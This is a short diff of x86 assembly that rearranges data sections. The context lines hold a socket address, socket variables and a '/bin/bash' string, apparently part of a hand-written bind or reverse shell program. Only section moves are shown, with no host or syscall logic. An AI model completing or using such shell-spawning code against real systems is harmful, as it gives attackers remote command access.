@@ -7,17 +7,14 @@ sock_address:
 	.zero	16
 	.comm	sock,4,4
 	.comm	sock_fd,4,4
-	.section	.rodata
+	.section	.data
 
 .bash_str_data:
 	.string	"/bin/bash"
-	.align 8
-	.size	bash, 8
-	.section .rodata
+	.section .text
 
 bash:
 	.quad	.bash_str_data
-	.text
 
 .global _start
 _start:
